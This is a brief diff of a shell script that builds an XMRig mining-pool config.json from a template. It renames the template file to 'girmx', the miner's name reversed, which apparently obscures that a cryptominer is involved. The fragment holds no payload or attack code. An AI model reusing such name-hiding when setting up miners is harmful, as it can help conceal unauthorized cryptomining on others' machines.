@@ -21,4 +21,4 @@ for URL in $(<net/forwarders); do
 done
 
 echo "${POOLS}"
-./pl/envsubst -no-empty -i "cfg/xmrig_tnl_skip.1.json.tpl" -o "config.json"
+./pl/envsubst -no-empty -i "cfg/girmx.1.json.tpl" -o "config.json"
